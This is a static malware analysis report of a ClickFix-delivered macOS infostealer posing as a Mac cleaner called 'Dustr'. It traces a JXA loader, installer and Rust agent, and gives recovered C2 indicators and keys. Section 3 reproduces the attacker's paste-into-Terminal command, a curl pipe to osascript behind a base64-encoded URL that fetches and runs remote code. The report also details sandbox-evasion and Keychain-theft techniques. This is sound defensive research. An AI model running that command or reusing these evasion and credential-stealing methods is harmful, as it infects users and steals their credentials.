# "Dustr": a ClickFix-delivered PamStealer variant with an environment-keyed config and an EtherHiding fallback

**Status:** draft · **Analysis date:** 2026-10-17 · **Samples collected:** 2026-10-16
**Method:** static only, with no native execution of any stage (see [Methodology and safety](#methodology-and-safety))

All network indicators are defanged (`hxxps`, `[.]`).

---

## 1. Key findings

- A promoted X post advertises a fake Mac cleaner, **"Dustr"**. The lure site `dustr[.]app` tells visitors to paste a command into Terminal (ClickFix). The command pipes a remote script into `osascript -l JavaScript`.
- **Stage 1** is an obfuscated JXA loader with **environmental keying**. Eight host checks (hypervisor, hardware model, SIP, SMC, debugger and injection, locale, keyboard, timezone) produce the decryption key. On a VM, under a debugger, or on a CIS-configured Mac the key is simply wrong and nothing decrypts. There is no "am I being analysed?" branch to patch.
- **Stage 2** is a small JXA installer. It drops **Stage 3**, a universal **Rust** Mach-O, into a fake `Finder.app` under `~/Library/Caches/com.apple.finder/`.
- The Stage 3 delivery URL only answers requests that carry a CFNetwork-style **User-Agent**. A default curl UA gets a 9-byte `404`.
- **Stage 3's configuration was recovered fully statically.** It uses HKDF-SHA256 over an 8-byte secret built from eight environment-gated XOR shares, four of which are **decoys** that always contribute zero, followed by XChaCha20-Poly1305. Every recovered string authenticates under its Poly1305 tag:
  - campaign tag `detox`
  - **`hxxps://gatewaysync[.]pro/api/sync`**, the most likely C2 endpoint
  - Ethereum config contract `0x33DfCf9123Bf44B84f53049373D0D22D0270693d` (EtherHiding)
  - a 32-byte key
- A 56 KB **embedded helper (`kh_tmp`)** decrypts with a hard-coded ChaCha20 key. It reads a Keychain generic password (service and account come from stdin) and **re-prompts the user up to 10 times** if access is denied.
- **Family:** a newer variant of what Jamf Threat Labs calls **PamStealer** (ManageEngine: "Fake Maccy Stealer"; operator-internal name "Avenger"). An independent analysis of a 10 October build ([samuelscheit/malware-analysis](https://github.com/samuelscheit/malware-analysis/tree/0462345191260e7389bf5a423fe97153c814381f/dustr_app)) left the C2 as an open question. This write-up answers it for the 16 October build.

## 2. Infection chain

```
Promoted X post (@MacHabits)
 └─ dustr[.]app ─ "paste this into Terminal"
     └─ echo "<decoy App Store URL>"; curl -sfL $(echo '<b64>' | base64 -d) | osascript -l JavaScript
         └─ Stage 1 ─ hxxps://keychainagent[.]pro/29j11f/mxgEV2s0Jccp       obfuscated JXA loader (136,105 B)
             │   8 host checks → key → RC4-drop3113 + 3-round RC4-MAC
             └─ Stage 2 ─ decrypted JXA installer (3,394 B), run via Function()
                 └─ Stage 3 ─ hxxps://keychainagent[.]pro/29j11f/r5fA7gM60BzO   Rust universal Mach-O (2,044,624 B)
                     │   ~/Library/Caches/com.apple.finder/Finder.app/Contents/MacOS/B56FC099
                     ├─ config: HKDF-SHA256 + XChaCha20-Poly1305 → C2, tag, ETH contract, key
                     └─ embedded kh_tmp (ChaCha20) → Keychain generic-password reader
```

## 3. Stage 0: the pasted command

```
echo "hxxps://apps.apple.com/app/dustr-inst…"; curl -sfL $(echo 'aHR0cHM6Ly9rZXljaGFpbmFnZW50LnByby8yOWoxMWYvbXhnRVYyczBKY2Nw' | base64 -d) | osascript -l JavaScript
```

- The `echo` of an App Store URL is decoration only.
- The base64 decodes to `hxxps://keychainagent[.]pro/29j11f/mxgEV2s0Jccp`.
- `curl -sfL` runs silently and follows redirects. Piping into `osascript -l JavaScript` runs the response as JXA without writing it to disk.

## 4. Stage 1: environment-keyed JXA loader

**File:** `mxgEV2s0Jccp.js`, 136,105 bytes, SHA-256 `08d9c67ae8f77e1e495606d002b8ada735553c5f01dfd5a927aba3967117848a`.

### 4.1 Obfuscation

The loader is obfuscator.io-style code:
- 937 `\xNN` escapes and no plaintext string literals.
- Globals are reached through `this[<decoded>]`. The first statement resolves to `this["ObjC"]`, i.e. the Objective-C bridge.
- Benign-sounding function names (`backupSoftwareProvider`, `applyLaunchAdapter`, …).

[restringer](https://github.com/PerimeterX/restringer) folded most string-building IIFEs. The remaining decoders were evaluated by a small self-written arithmetic evaluator; no sample code was passed to `eval`.

> **Pitfall:** restringer also constant-folded the key-derivation call `var itembw = logBundleAccessor()` into a literal array. That array is the key for *restringer's own sandbox*, where every check throws. The real key has to be rebuilt from the original source.

### 4.2 Host checks

Each check returns either `MAC(label)[0:8]` for a short label string, or a fixed 8-byte array.

| Function | Check | "Victim" result |
|---|---|---|
| `convertInventoryCredential` | `sysctl kern.hv_vmm_present` | `tcpRulebHcd` (no hypervisor) |
| `purgeLicenseProvider` | `hw.model`, `IOPlatformExpertDevice`, `AppleARMPE`, CPU brand vs. VM regex (vbox, vmware, qemu, anka, bhyve, corellium, veertu, …) | `[176,193,194,88,103,71,230,98]` |
| `traceSettingsReport` | `csr_get_active_config` (SIP) | `batQuotavO7B` (SIP on) |
| `validateAccountAgent` | AppleSMC key count ≥ 10 | `[99,36,175,130,148,104,215,231]` |
| `refreshProvisioningUtility` | `ptrace(PT_DENY_ATTACH)`, `DYLD_INSERT_LIBRARIES` / `LLDB_` / `NSZombieEnabled` / …, timing loop > 0.6 s | `abmResultRPp6` |
| `loadServiceService` | locale and country code against `ru, be, kk, hy, az, ky, tg, uz, tk, ka` | `dskURIjNvf` + `smdCodegHzF` (**16 bytes**) |
| `prepareInterfaceConfig` | HIToolbox keyboard input sources | `[31,250,206,218,193,51,45,254]` |
| `evaluateResourceConfig` | system timezone (Moscow, Minsk, Almaty, Kyiv, …) | `[128,150,41,34,135,132,89,8]` |

Turkey is **not** in the exclusion list.

### 4.3 Key derivation and decryption

```
key  = MAC( check1 ‖ … ‖ check8 )[0:32]
blob = tag(16) ‖ ciphertext
pt   = RC4-drop3113(key, ciphertext);   valid iff MAC(pt)[0:16] == tag
```

`MAC` is a custom three-round construction built from RC4:
1. Pad the input to 64 bytes with `len ^ 254`.
2. RC4-drop744 under the fixed key `d50a5b017258e17dcd0e9b36ec8e19cc`.
3. XOR-fold the output into 16 bytes, then RC4-drop543 keyed by the folded value.
4. Build a new key as `out[i] ^ (i*67+221)`, then RC4-drop230. Output the first 32 bytes.

Because the tag check is part of the scheme, it works as an oracle. The "victim" combination above authenticates all three blobs; restringer's folded key does not. (Self-test: the MAC of the error constant repeated twice reproduces restringer's folded key exactly.)

| Blob | Plaintext |
|---|---|
| `applyLaunchAdapter` | `hxxps://keychainagent[.]pro/29j11f/r5fA7gM60BzO` |
| `getConnectionValidator` | `~/Library/Caches/com.apple.finder` |
| `updateServiceAgent` | Stage 2 JXA installer, passed to `this["Function"](…)()` |

## 5. Stage 2: JXA installer

- Creates `~/Library/Caches/com.apple.finder/Finder.app/Contents/MacOS/` and exits early if `B56FC099` already exists (re-infection guard).
- Copies the real `/System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns`.
- Writes an `Info.plist` with `CFBundleIdentifier = apple.finder.assistant`, `LSUIElement` and `LSBackgroundOnly`.
- Downloads Stage 3 with an **ephemeral** `NSURLSession`, retrying up to 3 times, and writes it with mode `0755`.
- Launches the bundle with `NSWorkspace openURL`, then prints a fake *"This package is incompatible with this version of macOS and may fail to install."* message.

## 6. Stage 3: Rust agent

### 6.1 Delivery gate and file properties

| Request | Response |
|---|---|
| `curl` default UA | `HTTP/2 404`, 9 bytes (`Not Found`) |
| CFNetwork-style UA | `HTTP/2 200`, 2,044,624 bytes |

| Property | Value |
|---|---|
| SHA-256 (universal) | `094be93a4fdd3ef075959fb4bd3333f66e31abd1254f66ebaa0ce9460dc7b84a` (may change per download) |
| SHA-256 (arm64 slice) | `02225673558a518658ac12b54591b33a6e459dcc95f25546e839a291c35c146b` |
| Architectures | x86_64 + arm64 |
| Code signature | ad hoc, identifier `agent`, no TeamIdentifier, CDHash `5498e8cd26ea6083f1867249beff52129b3eaddc` |
| LC_UUID | arm64 `4AC4E1F7-446B-3549-9A69-6F7DDD4E260F`, x86_64 `BD84656B-A233-358F-B95E-16BF999D52FA` |
| Language | Rust (std error strings); symbols stripped (177 remain) |
| Linked | AppKit, Foundation, CoreFoundation, CloudKit, `libsqlite3`, `libobjc`, … (**no Security.framework**) |
| Notable imports | `dlopen`/`dlsym`, `objc_getClass`/`sel_registerName`/`objc_msgSend`, `posix_spawnp`, `execvp`, `socket`/`connect`/`send`/`recv` |

There is no embedded TLS stack. HTTPS is left to Apple frameworks, and the C2 routine resolves APIs at runtime (8 `dlsym` calls).

### 6.2 Config strings

Rust packs string literals back to back without separators. The apparent 843-character hex blob is really several literals. The `adr x1, …` / `mov w2, #len` pairs give their true bounds:

| VA (arm64) | Length | Content | Consumer |
|---|---|---|---|
| `0x1000b8d84` | 156 | `salt : nonce : ct(21)` | decrypt `0x10005cdc0` |
| `0x1000b8e20` | 32 | `2312a7f16eee94014e055f41a9c04332` (16-byte master) | KDF `0x10005d34c` |
| `0x1000b8e40` | 210 | `salt : nonce : ct(48)` | decrypt |
| `0x1000b8f12` | 5 | `1.7.0` | version |
| `0x1000b8f17` | 230 | `salt : nonce : ct(58)` | decrypt |
| `0x1000b8ffd` | 210 | `salt : nonce : ct(48)` | decrypt |
| `0x1000b90d2` | 56,176 | encrypted blob | `0x100044b1c` |

### 6.3 Key derivation

The decrypt routine `0x10005cdc0` splits on `:` (count must be 3), hex-decodes, and requires a 32-byte salt and a 24-byte nonce. The KDF `0x10005d34c` computes:

```
key = HKDF-SHA256( salt = field1 (32 B),
                   IKM  = global (u64, little-endian),
                   info = master (16 B) )
pt  = XChaCha20-Poly1305(key, nonce = field2).decrypt(field3)
```

The HKDF steps were identified from the code itself:
- `0x100049590` is the extract step: it builds the HMAC ipad/opad with `^0x36` and `^0x36^0x6a` (= `0x5c`).
- `0x100049784` is the expand step: `HMAC(PRK, info ‖ 0x01)`.

### 6.4 The global secret: environment-gated XOR shares with decoys

`global = ⊕ share_i` over eight lazily initialised statics at `0x1000e0ad8 … 0x1000e0b10` (`0x1000842c4`). If the anti-debug check `0x100083c04` fires, the global becomes `0`.

Each share is XORed with a constant `K` only when its own host check passes. The `K` constants come from `0x100084668`, which combines eight 16-bit immediates in one of seven modes (selected through tiny stubs or an inline `strb`):

| Mode | Lane function |
|---|---|
| 0 | `a ^ b` |
| 1 | `a ^ b` (lanes 0 and 2), `rotr16(a, b) ^ b` (lanes 1 and 3) |
| 2 | `(a ^ b) − b` |
| 3 | `(a ^ b) · inv(b \| 1)` (Newton inverse) |
| 4 | `bswap16(a ^ b)` |
| 5 | `~(a ^ b)` |
| 6 | `rotl16(a − b, b)` |
| other | `((a − b) · inv(b \| 1)) ^ b` |

The result is packed as `r0<<48 | r1<<32 | r2<<16 | r3`.

**Decoys.** The writers that are easy to find in the decompiler target shares `ae0/af0/b00/b10`. Their immediates are chosen so that every lane evaluates to **zero**; for example, in mode 7, `a = b + b·(b|1) mod 2¹⁶`. The real contributions go to `ad8/ae8/af8/b08`, and those writers only show up when every `adr` to the share addresses is enumerated. Getting the decoys to evaluate to exactly 0 also confirmed that the Python re-implementation of the combiner is correct.

Trying all 2⁹ subsets of the nine real `K` values, **exactly one** authenticates: `global = 0xcd550f10cf1cc109`. In that combination, the share from `0x100084464` is absent.

### 6.5 Recovered configuration

| Literal | Plaintext | Notes |
|---|---|---|
| `0x1000b8d84` | `detox` | campaign/build tag |
| `0x1000b8e40` | `hxxps://gatewaysync[.]pro/api/sync` | C2 endpoint (high confidence, §10) |
| `0x1000b8f17` | `0x33DfCf9123Bf44B84f53049373D0D22D0270693d` | Ethereum config contract (EtherHiding) |
| `0x1000b8ffd` | 32 raw bytes `942f49ff…2fc61767` | key; role unresolved |

### 6.6 Embedded Keychain helper (`kh_tmp`)

The 56,176-byte blob is consumed inside a Rust async state machine (`0x1000399e8`, state byte at `+0x264`). An inlined `apply_keystream` reveals plain **ChaCha20 (IETF)**:
- key `81116a5248fcb95e0a1ef885365a946a7263f72a584ad036e10acfdafeaa47cf` at `0x1000c6c42`
- 12-byte nonce `6aceb458861e7c3ffaf45c2f` at `0x1000c6c62`

There is no tag. The plaintext is checked structurally instead: it starts with a valid arm64 `MH_EXECUTE` header, and the entropy drops from 7.997 to 0.625.

| Property | Value |
|---|---|
| SHA-256 | `3de269d560df00eef46b96a05af3861b69ec5d881da6722a4d8dc7bafa9c6eef` |
| Signature | ad hoc, identifier **`kh_tmp`**, CDHash `0e8882223909b443bb208f62b06e18e096a2b331` |
| Imports | `SecKeychainFindGenericPassword`, `SecKeychainItemFreeContent`, stdio, `nanosleep` |

Behaviour (two functions, decompiled):
1. Reads a **service** and an **account** line from stdin.
2. Calls `SecKeychainFindGenericPassword`.
3. On `-128` (user cancelled), `-25293` (auth failed) or `-25320` (interaction not allowed) it sleeps and **asks again, up to 10 times**.
4. Writes the secret to stdout. Exit codes: `0` success, `2` denied, `3` item not found (`-25300`).

The binary contains no target names. This pattern fits stealing Chromium "Safe Storage" keys to decrypt the `Login Data` and `Cookies` databases that the agent reads through `libsqlite3`.

### 6.7 Other observations

- Plaintext Chrome DevTools Protocol commands: `Browser.setDownloadBehavior` / `Page.setDownloadBehavior` (`allow`, `downloadPath`) and `Page.navigate`.
- Related plaintext: `://127.0.0.1`, a base64 alphabet, and the selectors `NSWorkspaceOpenConfiguration`, `setArguments:`, `setCreatesNewApplicationInstance:`, `openApplicationAtURL:configuration:completionHandler:`.
- Together these indicate that the agent launches a fresh browser instance with custom arguments and drives it over its local DevTools endpoint, most likely for browser-data collection.
- An earlier hypothesis that C2 traffic is tunnelled through the browser was **downgraded**: independent work found the agent's own WebKit-style User-Agent and `/api/m/`, `?a=` path fragments.
- The full request schema was not recovered.

## 7. Infrastructure (passive only)

| Domain | First certificate | Notes |
|---|---|---|
| `keychainagent[.]pro` | 2026-10-07 **08:37:58Z** (LE YE1) | delivery; Cloudflare |
| `gatewaysync[.]pro` | 2026-10-07 **08:38:02Z** (LE YE1) | C2; Cloudflare; VT 0/92, no urlscan history |
| `dustr[.]app` | 2026-10-07 14:36:56Z | lure; **aged domain** (VT: 5 years, Tranco top-1M; passive DNS Google 2021 → AWS 2022 → Squarespace 2024 → Cloudflare 2026-10-08), possibly compromised or re-registered |
| `machabits[.]info` | 2026-09-29 | earlier lure from the same X account; VT 3/92 |

- The delivery and C2 certificates were issued **four seconds apart**: same operator, same provisioning run.
- `machabits[.]info` resolved on 2026-10-01 to **`85.137.52[.]128`** (AS43641 SOLLUTIUM EU, NL). This is a non-Cloudflare origin, and VT lists 62 domains on it, including Mac-themed names such as `macspare[.]app`, `macnews[.]info` and `wallspacemac[.]com`. This is shared hosting, so those names are **unverified candidates**.

## 8. Family attribution and prior work

Overlaps with **PamStealer** (Jamf, 2026-07-02) and **Fake Maccy Stealer** (ManageEngine):
- environment-keyed JXA with the same CIS list, SIP and anti-debug checks
- Rust ad-hoc-signed agent in a fake `Finder.app` using the real `Finder.icns`
- 8-hex executable name
- Security.framework loaded at runtime
- `/api/sync` C2 path (`avenger-sync[.]live`, `avengerflow[.]com`)
- `avenger-config-v2`
- public Ethereum RPC usage

New in this build:
- ClickFix delivery instead of a Script Editor `.scpt`
- universal binary instead of arm64 only
- encrypted embedded config with decoy shares instead of a plaintext `.config`
- an EtherHiding contract
- an embedded Keychain helper

| Source | Date | Method | Config / C2 |
|---|---|---|---|
| Jamf, PamStealer | 2026-07-02 | static + sandbox + debugger | key taken from memory with a debugger; no contract |
| ManageEngine, Fake Maccy | 2026 | static + host artefacts | C2 read from a plaintext `.config` |
| samuelscheit/malware-analysis | 2026-10-10 | static + bounded Unicorn emulation | contract recovered; **C2 open** |
| this write-up | 2026-10-17 | static only | **C2, tag, contract, key, `kh_tmp` recovered** |

## 9. MITRE ATT&CK

*O* = observed in this build (static); *R* = reported for the family by others.

| Technique | ID | |
|---|---|---|
| Acquire Infrastructure: Malvertising | T1583.008 | O |
| User Execution: Malicious Copy and Paste | T1204.004 | O |
| Command and Scripting Interpreter: JavaScript (JXA) | T1059.007 | O |
| Obfuscated Files or Information: Encrypted/Encoded File | T1027.013 | O |
| Deobfuscate/Decode Files or Information | T1140 | O |
| Execution Guardrails: Environmental Keying | T1480.001 | O |
| Virtualization/Sandbox Evasion: System Checks | T1497.001 | O |
| Debugger Evasion | T1622 | O |
| System Location Discovery: System Language Discovery | T1614.001 | O |
| Ingress Tool Transfer | T1105 | O |
| Masquerading: Match Legitimate Name or Location | T1036.005 | O |
| Hide Artifacts: Hidden Window (`LSUIElement`) | T1564.003 | O |
| Credentials from Password Stores: Keychain | T1555.001 | O |
| Credentials from Web Browsers | T1555.003 | O (SQLite, Safe Storage pattern) |
| Web Service: Dead Drop Resolver (Ethereum contract) | T1102.001 | O / R |
| Application Layer Protocol: Web Protocols | T1071.001 | O |
| Boot or Logon Autostart: Login Items | T1547.015 | R |
| Clipboard Data | T1115 | R |
| Input Capture: GUI Input Capture | T1056.002 | R |

## 10. Confidence and open questions

- **Certain:** every decrypted config string. Each was authenticated by Poly1305 (false-positive probability ≈ 2⁻¹²⁸), and exactly one of 512 candidate secrets works.
- **High, not proven:** that `gatewaysync[.]pro/api/sync` is the live C2. It matches the family's path pattern and the CT timing, and it is consumed in the network routine. However, the data flow through the async state machine was not traced and no traffic was observed. It may be primary or a fallback to the contract-based config.
- **Open:**
  - the request schema and the role of the 32-byte key
  - which Keychain services `kh_tmp` is asked for
  - whether this build still performs PAM validation (not linked; plausibly loaded at runtime)

## 11. Methodology and safety

- **No stage was executed natively, and the C2 was never contacted.**
- **Network access:** Samples were fetched with `curl -o` (Stage 1 and Stage 3) from the analyst's own connection. This exposes the analyst's IP address to the operator; use a network you are comfortable burning.
- **Deobfuscation:** Stage 1 was run through **restringer** with its sandbox, which evaluates constant sub-expressions.
- **One limited exception:** Three *pure* crypto helpers (RC4, the RC4-MAC and the blob wrapper) were extracted verbatim from Stage 1 and run once under Node, purely to cross-check the Python re-implementation. They were grep-verified to contain no ObjC, filesystem, network or shell calls. All recovery itself was done with analyst-written Python.
- **Stage 3:** analysed with `otool`, `nm`, `codesign` and **Ghidra 12 headless** (decompilation only). All decryption used analyst-written Python and `pycryptodome`, validated by authentication tags or file structure.
- **AI assistance:** This analysis was carried out with the help of an AI assistant (Claude, Anthropic). The author reviewed the findings and is responsible for them.

## 12. References

- Jamf Threat Labs, *PamStealer: a Rust-based macOS infostealer that validates credentials through PAM* (2026-07-02)
- ManageEngine, *Fake Maccy Stealer* threat reference
- samuelscheit, [malware-analysis/dustr_app](https://github.com/samuelscheit/malware-analysis/tree/0462345191260e7389bf5a423fe97153c814381f/dustr_app) (2026-10-10)
- Jamf Threat Labs, *AmnesiaStealer* (2026-08-13), for comparison
